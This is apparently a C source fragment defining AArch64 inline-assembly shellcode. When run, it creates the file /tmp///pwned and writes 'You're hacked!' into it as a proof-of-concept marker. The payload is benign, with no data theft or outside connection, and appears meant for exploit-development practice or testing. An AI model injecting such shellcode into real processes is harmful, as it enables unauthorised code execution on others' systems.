__asm__(".global shellcode\n"
	"shellcode:\n\t"
	/* push b'/tmp///pwned' */
	/* Set x14 = 8299904519029482031 = 0x702f2f2f706d742f */
	/* Set x15 = 0x64656e77 */
	"mov  x14, #29743\n\t"
	"movk x14, #28781, lsl #16\n\t"
	"movk x14, #12079, lsl #0x20\n\t"
	"movk x14, #28719, lsl #0x30\n\t"
	"mov  x15, #28279\n\t"
	"movk x15, #25701, lsl #16\n\t"
	"stp x14, x15, [sp, #-16]!\n\t"
	/* openat(dfd=0, fname='sp', flags=65, mode=0) */
	"mov  x0, #0\n\t"
	"mov  x1, sp\n\t"
	"mov  x2, 65\n\t"
	"mov  x3, #0\n\t"
	/* call openat() */
	"mov  x8, #56\n\t"
	"svc 0\n\t"
	/* push You're hacked!, 59 6f 75 27 72 65 20 68 61 63 6b 65 64 21 0a*/
	/* Set x14 = 0x6820657227756f59 */
	/* Set x15 = 0x0a2164656b6361 */
	"mov  x14, #28505\n\t"
	"movk x14, #10101, lsl #16\n\t"
	"movk x14, #25970, lsl #0x20\n\t"
	"movk x14, #26656, lsl #0x30\n\t"
	"mov  x15, #25441\n\t"
	"movk x15, #25963, lsl #16\n\t"
	"movk x15, #8548, lsl #0x20\n\t"
	"movk x15, #10, lsl #0x30\n\t"
	"stp x14, x15, [sp, #-16]!\n\t"
	/* write(fd=r0, buf='sp', count=15) */
	"mov  x1, sp\n\t"
	"mov  x2, #15\n\t"
	/* call write() */
	"mov  x8, #64\n\t"
	"svc 0\n\t"
	/* call exit(0) */
	"mov  x0, #0\n\t"
	"mov  x8, #93\n\t"
	"svc 0\n\t"
	);
